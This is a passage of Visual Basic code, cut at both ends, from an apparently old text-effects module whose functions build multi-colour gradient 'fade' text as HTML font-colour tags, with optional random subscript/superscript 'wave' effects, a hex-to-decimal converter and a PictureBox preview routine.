        TextDone$ = Left(part1$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / TextLen% * I) + B1, ((G2 - G1) / TextLen% * I) + G1, ((R2 - R1) / TextLen% * I) + R1)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part2
    TextLen% = Len(part2$)
    For I = 1 To TextLen%
        TextDone$ = Left(part2$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / TextLen% * I) + B2, ((G3 - G2) / TextLen% * I) + G2, ((R3 - R2) / TextLen% * I) + R2)
        colorx2 = RGBtoHEX(colorx)
        
    wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part3
    TextLen% = Len(part3$)
    For I = 1 To TextLen%
        TextDone$ = Left(part3$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / TextLen% * I) + B3, ((G4 - G3) / TextLen% * I) + G3, ((R4 - R3) / TextLen% * I) + R3)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part4
    TextLen% = Len(part4$)
    For I = 1 To TextLen%
        TextDone$ = Left(part4$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / TextLen% * I) + B4, ((G5 - G4) / TextLen% * I) + G4, ((R5 - R4) / TextLen% * I) + R4)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part5
    TextLen% = Len(part5$)
    For I = 1 To TextLen%
        TextDone$ = Left(part5$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / TextLen% * I) + B5, ((G6 - G5) / TextLen% * I) + G5, ((R6 - R5) / TextLen% * I) + R5)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part6
    TextLen% = Len(part6$)
    For I = 1 To TextLen%
        TextDone$ = Left(part6$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((b7 - B6) / TextLen% * I) + B6, ((g7 - G6) / TextLen% * I) + G6, ((r7 - R6) / TextLen% * I) + R6)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
        FadeSevenColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$
End Function
Function FadeByColor6(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, thetext$, WavY As Boolean)
'by AvaloN
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
rednum1% = val("&H" + Right(dacolor1$, 2))
greennum1% = val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = val("&H" + Left(dacolor1$, 2))
rednum2% = val("&H" + Right(dacolor2$, 2))
greennum2% = val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = val("&H" + Left(dacolor2$, 2))
rednum3% = val("&H" + Right(dacolor3$, 2))
greennum3% = val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = val("&H" + Left(dacolor3$, 2))
rednum4% = val("&H" + Right(dacolor4$, 2))
greennum4% = val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = val("&H" + Left(dacolor4$, 2))
rednum5% = val("&H" + Right(dacolor5$, 2))
greennum5% = val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = val("&H" + Left(dacolor5$, 2))
rednum6% = val("&H" + Right(dacolor6$, 2))
greennum6% = val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = val("&H" + Left(dacolor6$, 2))
FadeByColor6 = FadeSixColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, thetext, WavY)
End Function
Function FadeSixColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, thetext$, WavY As Boolean)
'by AvaloN
    TextLen% = Len(thetext)
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Right(thetext, fithlen%)
    'part1
    TextLen% = Len(part1$)
    For I = 1 To TextLen%
        TextDone$ = Left(part1$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / TextLen% * I) + B1, ((G2 - G1) / TextLen% * I) + G1, ((R2 - R1) / TextLen% * I) + R1)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part2
    TextLen% = Len(part2$)
    For I = 1 To TextLen%
        TextDone$ = Left(part2$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / TextLen% * I) + B2, ((G3 - G2) / TextLen% * I) + G2, ((R3 - R2) / TextLen% * I) + R2)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part3
    TextLen% = Len(part3$)
    For I = 1 To TextLen%
        TextDone$ = Left(part3$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / TextLen% * I) + B3, ((G4 - G3) / TextLen% * I) + G3, ((R4 - R3) / TextLen% * I) + R3)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part4
    TextLen% = Len(part4$)
    For I = 1 To TextLen%
        TextDone$ = Left(part4$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / TextLen% * I) + B4, ((G5 - G4) / TextLen% * I) + G4, ((R5 - R4) / TextLen% * I) + R4)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part5
    TextLen% = Len(part5$)
    For I = 1 To TextLen%
        TextDone$ = Left(part5$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / TextLen% * I) + B5, ((G6 - G5) / TextLen% * I) + G5, ((R6 - R5) / TextLen% * I) + R5)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    FadeSixColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$
End Function
Function CLRBars(RedBar As Control, GreenBar As Control, BlueBar As Control)
CLRBars = RGB(RedBar.Value, GreenBar.Value, BlueBar.Value)
End Function
Function Replacer(TheStr As String, This As String, WithThis As String)
Dim beer As String
beer = TheStr
Do While InStr(1, beer, This)
DoEvents
thepos% = InStr(1, beer, This)
beer = Left(beer, (thepos% - 1)) + WithThis + Right(beer, Len(beer) - (thepos% + Len(This) - 1))
Loop
Replacer = beer
End Function
Function GETVAL%(ByVal strLetter$)
  Select Case strLetter$
    Case "0"
      GETVAL = 0
    Case "1"
      GETVAL = 1
    Case "2"
      GETVAL = 2
    Case "3"
      GETVAL = 3
    Case "4"
      GETVAL = 4
    Case "5"
      GETVAL = 5
    Case "6"
      GETVAL = 6
    Case "7"
      GETVAL = 7
    Case "8"
      GETVAL = 8
    Case "9"
      GETVAL = 9
    Case "A"
      GETVAL = 10
    Case "B"
      GETVAL = 11
    Case "C"
      GETVAL = 12
    Case "D"
      GETVAL = 13
    Case "E"
      GETVAL = 14
    Case "F"
      GETVAL = 15
  End Select
End Function
Function Hex2Dec!(ByVal strHex$)
  If Len(strHex$) > 8 Then strHex$ = Right$(strHex$, 8)
  Hex2Dec = 0
  For X = Len(strHex$) To 1 Step -1
    CurCharVal = GETVAL(Mid$(UCase$(strHex$), X, 1))
    Hex2Dec = Hex2Dec + CurCharVal * 16 ^ (Len(strHex$) - X)
  Next X
End Function
Sub Fade_Preview_PicBox(PicB As Picturebox, ByVal FadedText As String)
FadedText$ = Replacer(FadedText$, Chr(13), "+chr13+")
OSM = PicB.ScaleMode
PicB.ScaleMode = 3
TextOffX = 0: TextOffY = 0
StartX = 2: StartY = 0
PicB.Font = "Arial"
PicB.FontSize = 10
PicB.FontBold = False
PicB.FontItalic = False
PicB.FontUnderline = False
PicB.FontStrikethru = False
PicB.AutoRedraw = True
PicB.ForeColor = 0&: PicB.Cls
For X = 1 To Len(FadedText$)
  c$ = Mid$(FadedText$, X, 1)
  If c$ = "<" Then
    TagStart = X + 1
    TagEnd = InStr(X + 1, FadedText$, ">") - 1
    T$ = LCase$(Mid$(FadedText$, TagStart, (TagEnd - TagStart) + 1))
    X = TagEnd + 1
    Select Case T$
      Case "u"
        PicB.FontUnderline = True
      Case "/u"
        PicB.FontUnderline = False
      Case "s"
        PicB.FontStrikethru = True
      Case "/s"
        PicB.FontStrikethru = False
      Case "b"    'start bold
        PicB.FontBold = True
      Case "/b"   'stop bold
        PicB.FontBold = False
      Case "i"    'start italic
        PicB.FontItalic = True
      Case "/i"   'stop italic
        PicB.FontItalic = False
      Case "sup"  'start superscript
        TextOffY = -1
      Case "/sup" 'end superscript
        TextOffY = 0
      Case "sub"  'start subscript
        TextOffY = 1
      Case "/sub" 'end subscript
        TextOffY = 0
      Case Else
        If Left$(T$, 10) = "font color" Then 'change font color
          ColorStart = InStr(T$, "#")
          ColorString$ = Mid$(T$, ColorStart + 1, 6)
          RedString$ = Left$(ColorString$, 2)
          GreenString$ = Mid$(ColorString$, 3, 2)
          BlueString$ = Right$(ColorString$, 2)
          RV = Hex2Dec!(RedString$)
          GV = Hex2Dec!(GreenString$)
          BV = Hex2Dec!(BlueString$)
          PicB.ForeColor = RGB(RV, GV, BV)
        End If
        If Left$(T$, 9) = "font face" Then 'added by monk-e-god
            fontstart% = InStr(T$, Chr(34))
            dafont$ = Right(T$, Len(T$) - fontstart%)
            PicB.Font = dafont$
        End If
    End Select
  Else  'normal text
    If c$ = "+" And Mid(FadedText$, X, 7) = "+chr13+" Then ' added by monk-e-god
        StartY = StartY + 16
        TextOffX = 0
        X = X + 6
    Else
        PicB.CurrentY = StartY + TextOffY
        PicB.CurrentX = StartX + TextOffX
        PicB.Print c$
        TextOffX = TextOffX + PicB.TextWidth(c$)
    End If
  End If
Next X
PicB.ScaleMode = OSM
End Sub
Function FadeByColor10(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, Colr8, Colr9, Colr10, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)
dacolor8$ = RGBtoHEX(Colr8)
dacolor9$ = RGBtoHEX(Colr9)
dacolor10$ = RGBtoHEX(Colr10)
rednum1% = val("&H" + Right(dacolor1$, 2))
greennum1% = val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = val("&H" + Left(dacolor1$, 2))
rednum2% = val("&H" + Right(dacolor2$, 2))
greennum2% = val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = val("&H" + Left(dacolor2$, 2))
rednum3% = val("&H" + Right(dacolor3$, 2))
greennum3% = val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = val("&H" + Left(dacolor3$, 2))
rednum4% = val("&H" + Right(dacolor4$, 2))
greennum4% = val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = val("&H" + Left(dacolor4$, 2))
rednum5% = val("&H" + Right(dacolor5$, 2))
greennum5% = val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = val("&H" + Left(dacolor5$, 2))
rednum6% = val("&H" + Right(dacolor6$, 2))
greennum6% = val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = val("&H" + Left(dacolor6$, 2))
rednum7% = val("&H" + Right(dacolor7$, 2))
greennum7% = val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = val("&H" + Left(dacolor7$, 2))
rednum8% = val("&H" + Right(dacolor8$, 2))
greennum8% = val("&H" + Mid(dacolor8$, 3, 2))
bluenum8% = val("&H" + Left(dacolor8$, 2))
rednum9% = val("&H" + Right(dacolor9$, 2))
greennum9% = val("&H" + Mid(dacolor9$, 3, 2))
bluenum9% = val("&H" + Left(dacolor9$, 2))
rednum10% = val("&H" + Right(dacolor10$, 2))
greennum10% = val("&H" + Mid(dacolor10$, 3, 2))
bluenum10% = val("&H" + Left(dacolor10$, 2))
FadeByColor10 = FadeTenColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, rednum8%, greennum8%, bluenum8%, rednum9%, greennum9%, bluenum9%, rednum10%, greennum10%, bluenum10%, thetext, WavY)
End Function
Function FadeByColor2(Colr1, Colr2, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
rednum1% = val("&H" + Right(dacolor1$, 2))
greennum1% = val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = val("&H" + Left(dacolor1$, 2))
rednum2% = val("&H" + Right(dacolor2$, 2))
greennum2% = val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = val("&H" + Left(dacolor2$, 2))
FadeByColor2 = FadeTwoColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, thetext, WavY)
End Function
Function FadeByColor3(Colr1, Colr2, Colr3, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
rednum1% = val("&H" + Right(dacolor1$, 2))
greennum1% = val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = val("&H" + Left(dacolor1$, 2))
rednum2% = val("&H" + Right(dacolor2$, 2))
greennum2% = val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = val("&H" + Left(dacolor2$, 2))
rednum3% = val("&H" + Right(dacolor3$, 2))
greennum3% = val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = val("&H" + Left(dacolor3$, 2))
FadeByColor3 = FadeThreeColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, thetext, WavY)
End Function
Function FadeByColor4(Colr1, Colr2, Colr3, Colr4, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
rednum1% = val("&H" + Right(dacolor1$, 2))
greennum1% = val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = val("&H" + Left(dacolor1$, 2))
rednum2% = val("&H" + Right(dacolor2$, 2))
greennum2% = val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = val("&H" + Left(dacolor2$, 2))
rednum3% = val("&H" + Right(dacolor3$, 2))
greennum3% = val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = val("&H" + Left(dacolor3$, 2))
rednum4% = val("&H" + Right(dacolor4$, 2))
greennum4% = val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = val("&H" + Left(dacolor4$, 2))
FadeByColor4 = FadeFourColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, thetext, WavY)
End Function
Function FadeByColor5(Colr1, Colr2, Colr3, Colr4, Colr5, thetext$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
rednum1% = val("&H" + Right(dacolor1$, 2))
greennum1% = val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = val("&H" + Left(dacolor1$, 2))
rednum2% = val("&H" + Right(dacolor2$, 2))
greennum2% = val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = val("&H" + Left(dacolor2$, 2))
rednum3% = val("&H" + Right(dacolor3$, 2))
greennum3% = val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = val("&H" + Left(dacolor3$, 2))
rednum4% = val("&H" + Right(dacolor4$, 2))
greennum4% = val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = val("&H" + Left(dacolor4$, 2))
rednum5% = val("&H" + Right(dacolor5$, 2))
greennum5% = val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = val("&H" + Left(dacolor5$, 2))
FadeByColor5 = FadeFiveColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, thetext, WavY)
End Function
Function FadeFiveColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, thetext$, WavY As Boolean)
'by monk-e-god
    TextLen% = Len(thetext)
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Right(thetext, frthlen%)
    'part1
    TextLen% = Len(part1$)
    For I = 1 To TextLen%
        TextDone$ = Left(part1$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / TextLen% * I) + B1, ((G2 - G1) / TextLen% * I) + G1, ((R2 - R1) / TextLen% * I) + R1)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part2
    TextLen% = Len(part2$)
    For I = 1 To TextLen%
        TextDone$ = Left(part2$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / TextLen% * I) + B2, ((G3 - G2) / TextLen% * I) + G2, ((R3 - R2) / TextLen% * I) + R2)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part3
    TextLen% = Len(part3$)
    For I = 1 To TextLen%
        TextDone$ = Left(part3$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / TextLen% * I) + B3, ((G4 - G3) / TextLen% * I) + G3, ((R4 - R3) / TextLen% * I) + R3)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part4
    TextLen% = Len(part4$)
    For I = 1 To TextLen%
        TextDone$ = Left(part4$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / TextLen% * I) + B4, ((G5 - G4) / TextLen% * I) + G4, ((R5 - R4) / TextLen% * I) + R4)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    FadeFiveColor = Faded1$ + Faded2$ + Faded3$ + Faded4$
End Function
Function FadeTenColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, r7%, g7%, b7%, r8%, g8%, b8%, R9%, G9%, B9%, R10%, G10%, B10%, thetext$, WavY As Boolean)
'by monk-e-god
    TextLen% = Len(thetext)
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    sevlen% = sevlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    eightlen% = eightlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    ninelen% = ninelen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Mid(thetext, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(thetext, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + 1, sevlen%)
    part8$ = Mid(thetext, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + sevlen% + 1, eightlen%)
    part9$ = Right(thetext, ninelen%)
    'part1
    TextLen% = Len(part1$)
    For I = 1 To TextLen%
        TextDone$ = Left(part1$, I)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / TextLen% * I) + B1, ((G2 - G1) / TextLen% * I) + G1, ((R2 - R1) / TextLen% * I) + R1)
        colorx2 = RGBtoHEX(colorx)
        wave1$ = ""
        wave2$ = ""
        If WavY = True Then
        If dawave = 1 Then wave1$ = "</SUB>"
        If dawave = 2 Then wave1$ = "</SUP>"
        Randomize
        dawave = Int((3 * Rnd) + 1)
        If dawave = 1 Then wave2$ = "<SUB>"
        If dawave = 2 Then wave2$ = "<SUP>"
        If dawave = 3 Then wave2$ = ""
        End If
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + wave1$ + wave2$ + LastChr$
    Next I
    'part2
    TextLen% = Len(part2$)
    For I = 1 To TextLen%
        TextDone$ = Left(part2$, I)
        LastChr$ = Right(TextDone$, 1)
